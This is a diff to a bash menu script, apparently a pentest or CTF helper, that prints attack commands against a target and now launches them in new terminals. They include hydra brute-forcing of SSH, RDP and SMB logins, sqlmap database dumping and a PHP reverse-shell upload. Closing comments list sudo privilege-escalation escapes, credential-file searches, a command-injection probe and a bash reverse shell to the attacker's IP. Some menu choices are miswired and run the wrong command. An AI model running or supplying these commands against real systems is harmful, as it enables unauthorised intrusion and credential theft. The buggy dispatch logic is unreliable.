@@ -100,80 +100,106 @@ function menu {
       read -p "Enter Your IP to use (Current IP: $myip): " "myip"
       ;;
     1)
+      rustscan="rustscan -g -a $T | cut -f 2 -d '[' | cut -f 1 -d ']'"
+      nmap1="nmap -sC -sV $T -p 80,443,9090"
+      nmap2="nmap -vv -Pn -A -sC -sS -T 4 -p- $T"
+      nmap3="nmap -v -sS -A -T4 $T"
+      nmap4="nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 $T"
+      nmap5="nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $T"
+      nmap6="nmap -sV -Pn -vv $T -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122"
       echo -e "\033[34mRustscan can be used for quick port scanning\033[0m"
-      command="rustscan -g -a $T | cut -f 2 -d '[' | cut -f 1 -d ']'"
-      echo "$command"
+      echo "(rustscan) $rustscan"
       echo -e "\033[34mThen we can pipe it into nmap with the ports we found for futher information where the ports are what we found from rustscan\033[0m"
-      echo "nmap -sC -sV $T -p 80,443,9090"
+      echo "(nmap1) $nmap1"
       echo -e "\033[34mGeneral Enumeration:\033[0m"
-      echo "nmap -vv -Pn -A -sC -sS -T 4 -p- $T"
+      echo "(nmap2) $nmap2"
       echo -e "\033[34mVerbose, syn, all ports, all scripts, no ping\033[0m"
-      echo "nmap -v -sS -A -T4 $T"
+      echo "(nmap3) $nmap3"
       echo ""
       echo -e "\033[34mVerbose, SYN Stealth, Version info, and scripts against services.\033[0m"
-      echo "nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 $T"
+      echo "(nmap4) $nmap4"
       echo ""
       echo -e "\033[34mSMTP Enumeration\033[0m"
-      echo "nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $T"
+      echo "(nmap5) $nmap5"
       echo ""
       echo -e "\033[34mMySQL Enumeration\033[0m"
-      echo "nmap -sV -Pn -vv $T -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122"
+      echo "(nmap6) $nmap6"
       ;;
     2)
+      wfuzz="wfuzz -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -Z -H \"Host: FUZZ.$site\" http://$site"
       echo -e "\033[34mWe can use wfuzz to try and find subdomains if we have found a domain name or vhost such as website.com\033[0m"
-      echo "wfuzz -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -Z -H \"Host: FUZZ.website.com\" http://website.com"
+      echo "(wfuzz) $wfuzz"
       ;;
     3)
+      whatweb="whatweb $T"
+      httpx="/usr/local/bin/httpx -status-code -title -tech-detect $T -p 8080,443,80,9999 2>&1"
       echo -e "\033[34mWe can use whatweb or httpx to check what a subdomain, subfolder or domain is hosting including version numbers\033[0m"
-      echo "whatweb $T:80"
-      echo "whatweb $T:80/admin"
-      echo "whatweb $T"
-      echo "/usr/local/bin/httpx -status-code -title -tech-detect $T -p 8080,443,80,9999" 2>&1
+      echo "(whatweb) $whatweb"
+      echo "(httpx) $httpx"
       ;;
     4)
+      dirsearch="dirsearch -u $T -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x 404 --exit-on-error -t 20 --cookie=$cookie --exclude-subdirs=js,css"
       echo -e "\033[34mIf you have logged into the site, make sure to run it with cookies using --cookies= to possible find more results\033[0m"
-      echo "dirsearch -u $T -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x 404 --exit-on-error -t 20 --cookie=$cookie --exclude-subdirs=js,css"
+      echo "(dirsearch) $dirsearch"
       ;;
     5)
+      host="python3 -m http.server 80"
       echo -e "\033[34mTo host a local folder make sure you are in that folder within the terminal you run this command\033[0m"
-      echo "python3 -m http.server 80"
+      echo "(host) $host"
       ;;
     6)
-      echo -e "\033[34mWordpress scanning is easy, if you have an API key from wpscan.com use that otherwise remove the api-token parameter\033[0m"
-      echo "wpscan --url http://$T --enumerate u,vp,vt --api-token=1234567890"
+      wpscan="wpscan --url http://$T --enumerate u,vp,vt"
+      echo -e "\033[34mWordpress scanning is easy, if you have an API key from wpscan.com use the api-token parameter --api-token=\033[0m"
+      echo "(wpscan) $wpscan"
       ;;
     7)
       echo -e "\033[34mJust a reminder of common folder/files to check\033[0m"
       echo "/robots.txt /crossdomain.xml /clientaccesspolicy.xml /phpinfo.php /sitemap.xml /.git"
       ;;
     8)
+      sqlmap="sqlmap -u \"https://$T/index.php?m=Index\" --level 5 --risk 3 --dump"
       echo -e "\033[34mIf you find fields that look like they might be injected with post data in the URL - also check for post data in burp\033[0m"
-      echo "sqlmap -u \"https://$T/index.php?m=Index\" --level 5 --risk 3 --dump"
+      echo "(sqlmap) $sqlmap"
       ;;
     9)
       echo -e "\033[34mCommon SMB commands\033[0m"
-      echo "smbclient -L //$T -U \"\""
-      echo "smbmap -H $T"
-      echo "showmount -e $T"
-      echo "#If showmount works"
-      echo "mount $T:/vol/share /mnt/nfs  -nolock"
-      echo "smbget -R smb://$T/anonymous"
-      echo "nmblookup -A $T"
+      smbclient="smbclient -L //$T -U \"\""
+      smbmap="smbmap -H $T"
+      showmount="showmount -e $T"
+      ifshowmount="#If showmount works"
+      mount="mount $T:/vol/share /mnt/nfs  -nolock"
+      smbget="smbget -R smb://$T/anonymous"
+      nmblookup="nmblookup -A $T"
+      echo "(smbclient) $smbclient"
+      echo "(smbmap) $smbmap"
+      echo "(showmount) $showmount"
+      echo "$ifshowmount"
+      echo "(mount) $mount"
+      echo "(smbget) $smbget"
+      echo "(nmblookup) $nmblookup"
       ;;
     10)
+      hydraftp="hydra -l root -P passwords.txt -t 32 $T ftp"
+      hydramysql="hydra -L usernames.txt -P pass.txt $T mysql"
+      hydrardp="hydra -V -f -L usernames.txt -P /usr/share/wordlists/rockyou.txt rdp://$T"
+      hydrasmb="hydra -l Administrator -P words.txt $T smb -t 1"
+      hydrasmtp="hydra -l root -P /usr/share/wordlists/rockyou.txt $T smtp -V"
+      hydrassh="hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T ssh"
+      hydratelnet="hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T telnet"
+      hydravnc="hydra -L /root/Desktop/usernames.txt –P /root/Desktop/pass.txt -s <PORT> $T vnc"
       echo -e "\033[34mCommon hydra commands\033[0m"
-      echo "hydra -l root -P passwords.txt -t 32 $T ftp"
-      echo "hydra -L usernames.txt -P pass.txt $T mysql"
-      echo "hydra -V -f -L usernames.txt -P /usr/share/wordlists/rockyou.txt rdp://$T"
-      echo "hydra -l Administrator -P words.txt $T smb -t 1"
-      echo "hydra -l root -P /usr/share/wordlists/rockyou.txt $T smtp -V"
-      echo "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T ssh"
-      echo "hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 $T telnet"
-      echo "hydra -L /root/Desktop/usernames.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc"
+      echo "(hydraftp) $hydraftp"
+      echo "(hydramysql) $hydramysql"
+      echo "(hydrasmb) $hydrasmb"
+      echo "(hydrasmtp) $hydrasmtp"
+      echo "(hydrassh) $hydrassh"
+      echo "(hydratelnet) $hydratelnet"
+      echo "(hydravnc) $hydravnc"
       ;;
     11)
+      netcat="nc -lvnp 1234"
       echo -e "\033[34mNetcat is helpful\033[0m"
-      echo "nc -lvnp 4444"
+      echo "(netcat) $netcat"
       ;;
     12)
       echo -e "\033[34mPHP reverse shell\033[0m"
@@ -192,13 +218,16 @@ function menu {
       echo "ssh -i id_rsa username@$T -p 22"
       ;;
     14)
+      wget="wget -m ftp://anonymous:anonymous@$T"
+      nmapftp="nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $T"
       echo -e "\033[34mFTP Stuff\033[0m"
-      echo "wget -m ftp://anonymous:anonymous@$T"
-      echo "nmap –script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 $T"
+      echo "(wget) $wget"
+      echo "(nmapftp) $nmapftp"
       ;;
     15)
+      dig="dig $T"
       echo -e "\033[34mDig for DNS stuff\033[0m"
-      echo "dig $T"
+      echo "(dig) $dig"
       ;;
     16)
       echo -e "\033[34mFind SUID files\033[0m"
@@ -256,8 +285,9 @@ function menu {
       echo "curl --upload-file phpreverseshell/php-reverse-shell.php --url http://$T/test/shell.php --http1.0"
       ;;
     18)
+      dnsrecon="dnsrecon -d $T -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml"
       echo -e "\033[34mDNS Zone Transfers\033[0m"
-      echo "dnsrecon -d $T -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml"
+      echo "(dnsrecon) $dnsrecon"
       ;;
     19)
       echo -e "\033[34mCommon SQL Injections\033[0m"
@@ -284,9 +314,12 @@ function menu {
       ;;
     99)
       echo -e "\033[34mEnumerating SNMP\033[0m"
-      echo "snmpget -v 1 -c public $T"
-      echo "snmpwalk -v 1 -c public $T"
-      echo "snmpbulkwalk -v2c -c public -Cn0 -Cr10 $T"
+      snmpget="snmpget -v 1 -c public $T"
+      snmpwalk="snmpwalk -v 1 -c public $T"
+      snmpbulkwalk="snmpbulkwalk -v2c -c public -Cn0 -Cr10 $T"
+      echo "(snmpget) $snmpget"
+      echo "(snmpwalk) $snmpwalk"
+      echo "(snmpbulkwalk) $snmpbulkwalk"
       echo ""
       echo -e "\033[34mFind processes running\033[0m"
       echo "ps aux"
@@ -320,11 +353,135 @@ function menu {
 while true; do
   menu
   echo ""
-  read -p "Press enter to return to the menu, type 'exit' to quit, or type 'shell' to open a new terminal: " input
+  read -p "Enter the number of the command you want to run or type 'exit' to quit, or type 'shell' to open a new terminal: " input
   if [ "$input" == "exit" ]; then
     break
   elif [ "$input" == "shell" ]; then
     gnome-terminal -- bash -c "echo fresh terminal; bash"
     continue
+  elif [ "$input" == "rustscan" ]; then
+    gnome-terminal -- bash -c "echo 'running $rustscan'; $rustscan; bash"
+    continue
+  elif [ "$input" == "nmap1" ]; then
+    gnome-terminal -- bash -c "echo 'running $nmap1'; $nmap1; bash"
+    continue
+  elif [ "$input" == "nmap2" ]; then
+    gnome-terminal -- bash -c "echo 'running $nmap2'; $nmap2; bash"
+    continue
+  elif [ "$input" == "nmap3" ]; then
+    gnome-terminal -- bash -c "echo 'running $nmap3'; $nmap3; bash"
+    continue
+  elif [ "$input" == "nmap4" ]; then
+    gnome-terminal -- bash -c "echo 'running $nmap4'; $nmap4; bash"
+    continue
+  elif [ "$input" == "nmap5" ]; then
+    gnome-terminal -- bash -c "echo 'running $nmap5'; $nmap5; bash"
+    continue
+  elif [ "$input" == "nmap6" ]; then
+    gnome-terminal -- bash -c "echo 'running $nmap6'; $nmap6; bash"
+    continue
+  elif [ "$input" == "wfuzz" ]; then
+    gnome-terminal -- bash -c "echo 'running $wfuzz'; $wfuzz; bash"
+    continue
+  elif [ "$input" == "whatweb" ]; then
+    gnome-terminal -- bash -c "echo 'running $whatweb'; $whatweb; bash"
+    continue
+  elif [ "$input" == "httpx" ]; then
+    gnome-terminal -- bash -c "echo 'running httpx'; $httpx; bash"
+    continue
+  elif [ "$input" == "dirsearch" ]; then
+    gnome-terminal -- bash -c "echo 'running $dirsearch'; $dirsearch; bash"
+    continue
+  elif [ "$input" == "host" ]; then
+    gnome-terminal -- bash -c "echo 'running $host'; $host; bash"
+    continue
+  elif [ "$input" == "wpscan" ]; then
+    gnome-terminal -- bash -c "echo 'running $wpscan'; $wpscan; bash"
+    continue
+  elif [ "$input" == "sqlmap" ]; then
+    gnome-terminal -- bash -c "echo 'running $sqlmap'; $sqlmap; bash"
+    continue
+  elif [ "$input" == "smbclient" ]; then
+    gnome-terminal -- bash -c "echo 'running $rustscan'; $rustscan; bash"
+    continue
+  elif [ "$input" == "smbmap" ]; then
+    gnome-terminal -- bash -c "echo 'running $smbmap'; $smbmap; bash"
+    continue
+  elif [ "$input" == "showmount" ]; then
+    gnome-terminal -- bash -c "echo 'running $showmount'; $showmount; bash"
+    continue
+  elif [ "$input" == "mount" ]; then
+    gnome-terminal -- bash -c "echo 'running $mount'; $mount; bash"
+    continue
+  elif [ "$input" == "smbget" ]; then
+    gnome-terminal -- bash -c "echo 'running $smbget'; $smbget; bash"
+    continue
+  elif [ "$input" == "nmblookup" ]; then
+    gnome-terminal -- bash -c "echo 'running $nmblookup'; $nmblookup; bash"
+    continue
+  elif [ "$input" == "hydraftp" ]; then
+    gnome-terminal -- bash -c "echo 'running $hydraftp'; $hydraftp; bash"
+    continue
+  elif [ "$input" == "hydramysql" ]; then
+    gnome-terminal -- bash -c "echo 'running $rustscan'; $rustscan; bash"
+    continue
+  elif [ "$input" == "hydrardp" ]; then
+    gnome-terminal -- bash -c "echo 'running $hydrardp'; $hydrardp; bash"
+    continue
+  elif [ "$input" == "hydrasmb" ]; then
+    gnome-terminal -- bash -c "echo 'running $hydrasmb'; $hydrasmb; bash"
+    continue
+  elif [ "$input" == "hydrasmtp" ]; then
+    gnome-terminal -- bash -c "echo 'running $hydrasmtp'; $hydrasmtp; bash"
+    continue
+  elif [ "$input" == "hydrassh" ]; then
+    gnome-terminal -- bash -c "echo 'running $hydrassh'; $hydrassh; bash"
+    continue
+  elif [ "$input" == "hydratelnet" ]; then
+    gnome-terminal -- bash -c "echo 'running $hydratelnet'; $hydratelnet; bash"
+    continue
+  elif [ "$input" == "hydravnc" ]; then
+    gnome-terminal -- bash -c "echo 'running $hydravnc'; $hydravnc; bash"
+    continue
+  elif [ "$input" == "netcat" ]; then
+    gnome-terminal -- bash -c "echo 'running $netcat'; $netcat; bash"
+    continue
+  elif [ "$input" == "wget" ]; then
+    gnome-terminal -- bash -c "echo 'running $wget'; $wget; bash"
+    continue
+  elif [ "$input" == "nmapftp" ]; then
+    gnome-terminal -- bash -c "echo 'running $nmapftp'; $nmapftp; bash"
+    continue
+  elif [ "$input" == "dig" ]; then
+    gnome-terminal -- bash -c "echo 'running $dig'; $dig; bash"
+    continue
+  elif [ "$input" == "dnsrecon" ]; then
+    gnome-terminal -- bash -c "echo 'running $dnsrecon'; $dnsrecon; bash"
+    continue
+  elif [ "$input" == "snmpget" ]; then
+    gnome-terminal -- bash -c "echo 'running $snmpget'; $snmpget; bash"
+    continue
+  elif [ "$input" == "snmpwalk" ]; then
+    gnome-terminal -- bash -c "echo 'running $snmpwalk'; $snmpwalk; bash"
+    continue
+  elif [ "$input" == "snmpbulkwalk" ]; then
+    gnome-terminal -- bash -c "echo 'running $snmpbulkwalk'; $snmpbulkwalk; bash"
+    continue
   fi
 done
+
+#Commands to add
+#find / -name id_rsa 2> /dev/null
+#find / -name authorized_keys 2> /dev/null
+#cat ~/.bash_history
+#a. sudo find /bin -name nano -exec /bin/sh \;
+#b. sudo awk 'BEGIN {system("/bin/sh")}'
+#c. echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse
+#d. sudo vim -c '!sh'
+#e. sudo apache2 -f /etc/shadow
+#find / -type f -perm -04000 -ls 2>/dev/null
+#strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
+#getcap -r / 2>/dev/null
+#gobuster  dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://<ip>:8081/ -x php,txt,html,sh,cgi
+#Test api endpoints for breakouts: /ping?ip=google.com | `ls`
+#bash -i >& /dev/tcp/$myip/4444 0>&1
